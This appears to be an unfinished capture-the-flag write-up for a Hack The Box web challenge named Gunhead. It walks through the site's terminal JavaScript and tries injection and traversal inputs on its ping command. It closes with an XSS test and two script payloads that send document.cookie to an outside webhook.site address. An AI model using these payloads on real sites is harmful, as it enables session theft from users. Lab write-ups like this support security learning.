# Gunhead

## FLAG: HTB{}

## Status: Incomplete

+ DOCKER: Yes
+ DOWNLOADABLE: Yes

Description: During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

## NOTES

1. Deploy Docker
   1. > IP: 159.65.81.51:31241
2. Extract file
   1. > unzip web_gunhead.zip
      1. FILE(S): challenge(dir), config(dir), dockerfile, build-docker.sh, flag.txt
3. Navigate to website
   1. On here we see a robot / AI looking machine that has a couple features
      1. Status -> this displays the status of the robot
      2. Needs -> this displays the needs (ie. Current Power, Health, Weapon systems, etc.)
      3. Command -> this is a terminal style input that allows us to type in a handful of commands
         1. > /help -> displays all commands
         2. > /clear -> clears the command prompt
         3. > /ping -> ping [device-IP], check recon system
         4. > /storage -> check storage
4. Investigate the code
   1. If we go to the /challenge/static/js/script.js file we will see the code behind the terminal structure

        ```js
            term.processCommand = function (com) {
            regex = /\/ping [A-Za-z0-9_.]*/gm;

            switch (com.toLowerCase()) {
                case '/clear':
                {
                    term.clear();
                    break;
                }
                case '/help':
                {
                    term.print();
                    term.printG('Current Command List:');
                    term.printG('/clear  // Clears the command prompt. Cannot be undone.');
                    term.printG('/ping [device IP] // Check recon system')
                    term.printG('/storage // check storage')
                    break;
                }
                case String(com.toLowerCase().match(/\/ping .*/)):
                {
                    host = com.toLowerCase().replace('/ping', '');
                    term.print(`[+] Starting scan on ${host}`);

                    fetch('/api/ping', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        'ip': host
                    })
                    })
                    .then(res => res.json())
                    .then(data => {
                        data = data.output.replaceAll(/\n/g, '<br>');

                        term.print('');
                        term.printG(data);
                    });
                    break;
                }
                case '/storage':
                {
                    term.print();
                    term.printG('Filesystem: /dev/sda1');
                    term.printG('Total Space: 20TB');
                    term.printG('Used Space: 14TB');
                    term.printG('Available Space: 6TB');
                    term.printG('Use Percentage: 70%');
                    term.printG('Mounted On: /');
                    term.print();
                    break;
                }
                default:
                {
                    term.print();
                    term.printG('Unable to understand the command!');
                    break;
                }
            }
            if (com) { term.print('> ' + com); } // echo
        ```

   2. In here we see a switch statement that breaks the commands down into cases (ie. /clear. /help, /ping, /storage)
   3. Running through all the commands I tried
      1. > /ping 'http://159.65.81.51:31241/'
      2. > /ping 'http://159.65.81.51:31241/flag.txt'
      3. > /ping 'http://159.65.81.51:31241/../flag.txt'
      4. > /ping 'http://159.65.81.51:31241/../../flag.txt'
      5. No results
         1. So maybe we can user XSS
5. XSS
   1. Lets test using a basic `<script>alert(1)</script>`
      1. SUCCESS!!
   2. Okay so now lets see if we can use JS to read a file
      1. ATTEMPTS.html
   3. Lets try a different route
      1. Rather than trying to leak the flag with XSS lets try and grab the cookie



<script>
fetch('https://webhook.site/685c4977-50d5-430b-bcbd-bca194fbebab?c=' + document.cookie)
</script>

<script>document.location='https://webhook.site/685c4977-50d5-430b-bcbd-bca194fbebab?cookie='+document.cookie</script>